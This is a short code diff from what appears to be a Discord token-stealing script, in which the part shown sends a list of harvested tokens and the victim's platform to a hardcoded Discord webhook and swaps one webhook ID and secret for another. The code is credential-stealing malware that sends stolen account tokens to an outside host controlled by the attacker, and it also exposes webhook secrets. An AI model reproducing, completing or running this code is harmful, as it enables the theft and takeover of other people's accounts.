@@ -36,7 +36,6 @@ def main():
                 message += f'`{token}`\n\n'
         else:
             message += 'No tokens found.\n'
-        webhook = Webhook.partial(776876016236494888, 'ZJ5W_4EUUSCQHsaK2NYd6Dc2m7NCzgOFDiNSie6mbya04ooUEqgJSd3AI5LElQx1Vkzr', adapter=RequestsWebhookAdapter()) # Put here your discord webhook
+        webhook = Webhook.partial(798834381812662292, 'KtHaCiIEIKucF0HvAp77Zezy9ygPIvcChnVjg2mLZE5T59zCQvpzKYQxMI27PPn7E54H', adapter=RequestsWebhookAdapter()) # Put here your discord webhook
         webhook.send(f'{platform}\n{message}')
 main()
-a = input('Succes')
